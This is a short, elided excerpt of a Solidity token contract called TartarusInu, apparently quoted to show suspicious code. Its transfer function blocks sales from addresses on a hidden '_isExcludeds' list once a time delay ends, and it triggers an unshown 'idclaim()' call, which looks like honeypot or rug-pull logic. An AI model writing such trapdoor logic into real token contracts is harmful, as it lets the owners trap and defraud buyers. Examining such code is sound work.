...
contract TartarusInu  is Context, IERC20 { 
    ...
    address payable public DevWallet = payable(0x5d8C3300F2cCAb7568e56CFC72d81744700f30Bc);
    address payable public MarketingWallet = payable(0x5d8C3300F2cCAb7568e56CFC72d81744700f30Bc);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 20 <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + 10 <= block.timestamp) {idclaim();}
